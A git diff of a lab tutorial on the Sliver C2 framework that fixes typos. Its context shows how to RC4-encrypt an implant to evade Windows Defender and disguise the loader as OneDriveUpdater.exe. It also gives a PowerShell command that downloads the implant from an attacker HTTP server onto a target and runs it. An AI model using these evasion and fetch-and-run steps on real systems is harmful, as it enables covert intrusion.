@@ -1,12 +1,12 @@
 # Part 2 - Using Sliver C2 client/server and Alternate AV bypass
 
 ## **Intro**
-In this part, we will be using silver server and client feature to show how the multi user feature works and can be used as a singlee user to avoid client crashes/hangs from affecting the sliver server.
+In this part, we will be using silver server and client feature to show how the multi user feature works and can be used as a single user to avoid client crashes/hangs from affecting the sliver server.
 
 We will use a [AV bypass method from my repo "av-bypass"](https://github.com/jjkirn/av-bypass) to bypass Windows Defender to get the sliver implant to our lab Windows Worstation target - WS0. 
 
 ## **Note:**
-Be aware that the "av-bypass" method described in that repo is complicated by the fact that you need to create a "Windows Studio 2022" development environment to compile some C+ code to create the obsuscated implant code. If you think this is too complicated and just want to see how sliver client/server works, refer the to steps oulined in [part 1](/notes/part1.md) to turn off Windows Defender.
+Be aware that the "av-bypass" method described in that repo is complicated by the fact that you need to create a "Windows Studio 2022" development environment to compile some C+ code to create the obsuscated implant code. If you think this is too complicated and just want to see how sliver client/server works, refer the to steps oulined in [part 1](/notes/part1.md) to turn off Windows Defender on the target (WS01).
 
 ---
 ## **Getting Started**
@@ -117,7 +117,7 @@ In another Kali terminal window go to /tmp:
 http.bin
 ```
 
-Get the rc4.py from [my av-bypass repo](https://github.com/jjkirn/av-bypass) - (encrypt using rc4)
+Get the rc4.py from [my av-bypass repo](https://github.com/jjkirn/av-bypass) - (encrypt using rc4):
 ```
 ┌──(jim㉿kali)-[/tmp]
 └─$ ls       
@@ -125,14 +125,14 @@ http.bin
 rc4.py
 ```
 
-Encrypt the code, set key = advapi32.dll to avoid looking suspicious
+Encrypt the code, set key = advapi32.dll to avoid looking suspicious:
 ```
 ┌──(jim㉿kali)-[/tmp]
 └─$ python3 rc4.py advapi32.dll http.bin
 Written http.bin.enc
 ```
 
-Now have the RC4 encypted output
+Now have the RC4 encypted output:
 ```
 ┌──(jim㉿kali)-[/tmp]
 └─$ ls
@@ -141,7 +141,7 @@ http.bin.enc
 rc4.py
 ```
 
-Now we need to convert the http.bin.enc file output to a data format needed for the Windows compliler
+Convert the http.bin.enc file output to a data format needed for the Windows compliler:
 ```
 ┌──(jim㉿kali)-[/tmp]
 └─$ hexdump -v -e '1/2 "dw 0%.4xh\n"' http.bin.enc | tee out.txt
@@ -165,10 +165,10 @@ drwxr-xr-x 19 root root     4096 Apr 25 23:41 ..
 -rw-r--r--  1 jim  jim       732 Jun  3 19:05 rc4.py
 ```
 
-Notice that "out.txt" is around 54 MB, a really big assembly file
+Notice that "out.txt" is around 54 MB, a really big assembly file.
 
 ---
-In Part 2 of [my av-bypass repo](https://github.com/jjkirn/av-bypass) it tells you how to build a Windows 11 dev machine. On that machine, you copy the contents of the Kali "out.txt" file to a Windows Visual Studio project as "data.asm" file. The Visual Studio project files are also located in that repo.
+In Part 2 of [my av-bypass repo](https://github.com/jjkirn/av-bypass) it tells you how to build a Windows 11 dev machine. On that machine, you copy the contents of the Kali "out.txt" file to a Windows Visual Studio project as a "data.asm" file. The Visual Studio project files are also located in that repo.
 
 Now on the Windows 11 dev manchine. Compile the project. The output will be located in the x64/Release directory.
 
@@ -188,7 +188,7 @@ Mode                LastWriteTime        Length Name
 ---
 Back on Kali VM.
 
-Copy the "wutai_loader.exe" file to the Kali machine at the "www" directory and rename it OneDriveUploader.exe
+Copy the "wutai_loader.exe" file to the Kali machine at the "www" directory and rename it OneDriveUploader.exe:
 ```
 ┌──(jim㉿kali)-[~/Desktop/active_directory/hacks/www]
 └─$ mv wutai_loader.exe OneDriveUpdater
@@ -206,7 +206,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
 ---
-Switch to the Windows Worstation target (WS01) and download the implant!
+Switch to the Windows Workstation target (WS01) and download the implant!
 ```
 open command window
 cd C:\windows\tasks
@@ -214,7 +214,7 @@ C:\windows\tasks>powershell
 PS C:\Wndows\Tasks> iwr http://192.168.175.130/OneDriveUpdater.exe -o OneDriveUpdater.exe
 ```
 
-Execute the implant
+Execute the implant:
 ```
 .\OneDriveUpdater.exe
 ```
